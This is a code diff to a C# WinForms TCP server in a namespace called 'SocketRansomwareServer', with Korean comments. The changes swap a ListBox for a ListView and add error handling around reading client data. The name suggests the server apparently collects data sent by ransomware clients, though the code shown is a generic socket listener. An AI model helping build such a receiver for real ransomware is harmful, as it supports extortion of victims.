@@ -45,23 +45,19 @@ namespace SocketRansomwareServer
             {
                 client = listener.AcceptTcpClient(); //클라이언트 acccept
                 clients cList = new clients(); //클라이언트 데이터반환 쓰레드
-                cList.Set(client, listBox1); //설정+시작
+                cList.Set(client, listView1); //설정+시작
             }
         }
 
-        private void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
-        {
-
-        }
         class clients
         {
             private delegate void SafeCallDelegate(string text);
             TcpClient tcp; //해당쓰레드에서 담당할 클라이언트 객체
-            ListBox listBox; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
-            public void Set(TcpClient tcp, ListBox listBox)
+            ListView listView; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
+            public void Set(TcpClient tcp, ListView listView)
             {
                 this.tcp = tcp;
-                this.listBox = listBox;
+                this.listView = listView;
                 Thread thr = new Thread(Run);
                 thr.IsBackground = true;
                 thr.Start();
@@ -73,25 +69,32 @@ namespace SocketRansomwareServer
                 NetworkStream net;//네트워크스트림(소켓상에 데이터가 존재하는곳)
                 while (true)
                 {
-                    for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
-                    net = tcp.GetStream(); //네트워크스트림 얻어오기
-                    net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
-                    str = Encoding.Default.GetString(bytes); //인코딩
-                    UpdateListBoxSafe(str);
+                    try
+                    {
+                        for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
+                        net = tcp.GetStream(); //네트워크스트림 얻어오기
+                        net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
+                        str = Encoding.Default.GetString(bytes); //인코딩
+                        UpdateListViewSafe(str);
+                    } catch(Exception e)
+                    {
+                        Console.WriteLine(e.Message);
+                        break;
+                    }
 
                 }
             }
-            private void UpdateListBoxSafe(string text)
+            private void UpdateListViewSafe(string text)
             {
-                if (listBox.InvokeRequired)
+                if (listView.InvokeRequired)
                 {
-                    SafeCallDelegate d = new SafeCallDelegate(UpdateListBoxSafe);
-                    listBox.Invoke(d, new object[] { text });
+                    SafeCallDelegate d = new SafeCallDelegate(UpdateListViewSafe);
+                    listView.Invoke(d, new object[] { text });
 
                 }
                 else
                 {
-                    listBox.Items.Add(text); //표시
+                    listView.Items.Add(text); //표시
                 }
             }
         }
